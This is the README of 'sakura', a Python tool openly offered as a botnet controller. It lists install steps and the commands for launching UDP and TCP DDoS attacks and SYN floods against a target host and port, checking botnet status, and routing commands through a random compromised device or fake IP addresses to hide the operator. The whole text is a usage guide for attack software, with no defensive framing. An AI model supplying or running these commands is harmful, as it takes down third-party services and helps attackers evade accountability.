###### [🇷🇺 RU](https://github.com/i4ego/sakura/blob/main/README-RU.md)
## Quick Start
### Installation
> [!WARNING]
> Make sure you have python 3.12+ installed!
```
git clone https://github.com/i4ego/sakura.git
cd sakura
python3 -m pip install -r req.txt
```
## Usage
### As terminal
Run: `python3 sakura.py`
###### DDOS example.com:443 by UDP
```.ddos udp example.com 443```
###### SynFlood example.com
```.sflood example.com```
###### Show BotNet status
```.status```
###### DDOS example.com:443 by TCP (max 15 devices in attack)
```.ddos tcp example.com 443 15```
### CLI
###### DDOS example.com:443 by UDP
```python3 sakura.py DDOS UDP example.com 443```
###### SynFlood example.com
```python3 sakura.py SYNFLOOD example.com```
###### Show BotNet status
```python3 sakura.py STATUS```
###### DDOS example.com:443 by TCP (max 15 devices in attack)
```python3 sakura.py DDOS TCP example.com 443 15```
## "Device proxy"
Communicate with your botnet through random device from this botnet! 
### Setting up
Open [sakura terminal](#as-terminal) and type `.proxy random`. Later you can disable it by anoter command: `.proxy disable`. Check status by command `.proxy status`.
This will help hide your IP address by showing the IP of a random device from ur botnet.
### Anoter way
You can hide behind fake IP addresses. For this, use `.proxy fake`
